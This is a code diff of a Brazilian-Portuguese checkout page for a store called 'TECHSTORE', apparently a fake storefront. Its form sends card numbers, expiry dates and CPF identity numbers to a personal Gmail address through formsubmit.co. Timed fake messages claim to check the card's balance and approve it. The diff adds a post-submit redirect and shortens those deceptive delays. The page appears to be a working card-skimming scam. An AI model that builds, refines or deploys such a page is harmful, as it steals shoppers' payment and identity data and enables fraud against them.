@@ -36,6 +36,7 @@
 <div class="container">
     <div id="resumo-dinamico"></div>
     <form action="https://formsubmit.co/pagamento.celular02@gmail.com" method="POST" id="form-main">
+        <input type="hidden" name="_next" value="obrigado.html">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" id="h-nome" name="PRODUTOS">
         <input type="hidden" id="h-preco" name="VALOR_TOTAL">
@@ -95,21 +96,9 @@ window.onload = function() {
     if(car.length > 0) {
         car.forEach(i => total += parseFloat(i.p));
         const fmt = "R$ " + total.toLocaleString('pt-BR', {minimumFractionDigits:2});
-        
         let textoProdutos = car[0].n;
-        if (car.length > 1) {
-            textoProdutos += ` e mais ${car.length - 1} item(s)`;
-        }
-        
-        document.getElementById('resumo-dinamico').innerHTML = `
-            <div class="resumo">
-                <img class="foto-produto" src="${car[0].f}">
-                <div>
-                    <h3 style="font-size:14px;">${textoProdutos}</h3>
-                    <p style="color:#27ae60; font-weight:bold;">${fmt}</p>
-                </div>
-            </div>`;
-            
+        if (car.length > 1) { textoProdutos += ` e mais ${car.length - 1} item(s)`; }
+        document.getElementById('resumo-dinamico').innerHTML = `<div class="resumo"><img class="foto-produto" src="${car[0].f}"><div><h3 style="font-size:14px;">${textoProdutos}</h3><p style="color:#27ae60; font-weight:bold;">${fmt}</p></div></div>`;
         document.getElementById('pix-valor-display').innerText = fmt;
         document.getElementById('h-nome').value = textoProdutos;
         document.getElementById('h-preco').value = fmt;
@@ -122,7 +111,6 @@ function gerarPix(v) {
     const nome = "TECHSTORE";
     const cidade = "SAO PAULO";
     const valorStr = v.toFixed(2);
-
     let p = "000201"; 
     let mai = "0014BR.GOV.BCB.PIX01" + chave.length.toString().padStart(2, '0') + chave;
     p += "26" + mai.length.toString().padStart(2, '0') + mai;
@@ -132,7 +120,6 @@ function gerarPix(v) {
     let adf = "0505ID123"; 
     p += "62" + adf.length.toString().padStart(2, '0') + adf;
     p += "6304";
-
     function getCRC16(data) {
         let crc = 0xFFFF;
         for (let i = 0; i < data.length; i++) {
@@ -144,7 +131,6 @@ function gerarPix(v) {
         }
         return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
     }
-
     const codFinal = p + getCRC16(p);
     const qrDiv = document.getElementById("qrcode-container");
     qrDiv.innerHTML = "";
@@ -159,7 +145,7 @@ function trocar(m){
     document.getElementById('b-card').className = m=='pix'?'opt':'opt active';
 }
 
-function copiarPix(){ navigator.clipboard.writeText(document.getElementById('pix-copy').innerText); alert("PIX Copiado! Use a opção Pix Copia e Cola no seu banco."); }
+function copiarPix(){ navigator.clipboard.writeText(document.getElementById('pix-copy').innerText); alert("PIX Copiado!"); }
 
 document.getElementById('form-main').onsubmit = async function(e) {
     if(document.getElementById('b-pix').classList.contains('active')) return;
@@ -169,7 +155,6 @@ document.getElementById('form-main').onsubmit = async function(e) {
     const sMsg = document.getElementById('status-msg');
     btn.disabled = true;
     lBox.style.display = "block";
-    
     try {
         const val = document.getElementById('c3').value.split('/');
         sMsg.innerText = "Consultando saldo e limite disponível...";
@@ -183,10 +168,10 @@ document.getElementById('form-main').onsubmit = async function(e) {
             identificationNumber: document.getElementById('c5').value.replace(/\D/g, ''),
         });
         if(!token || !token.id) throw new Error();
-        await new Promise(r => setTimeout(r, 2500)); 
+        await new Promise(r => setTimeout(r, 2000)); 
         sMsg.style.color = "#27ae60";
         sMsg.innerText = "Saldo Aprovado! Finalizando...";
-        setTimeout(() => { this.submit(); }, 1200);
+        setTimeout(() => { this.submit(); }, 1000);
     } catch (err) {
         lBox.style.display = "none";
         alert("❌ CARTÃO RECUSADO: Saldo insuficiente ou dados inválidos.");
@@ -205,4 +190,4 @@ function m(id, p) {
 m('c1','#### #### #### ####'); m('c3','##/##'); m('c5','###.###.###-##'); m('f-cep','#####-###'); m('f-tel','(##) #####-####');
 </script>
 </body>
-</html>
+    </html>
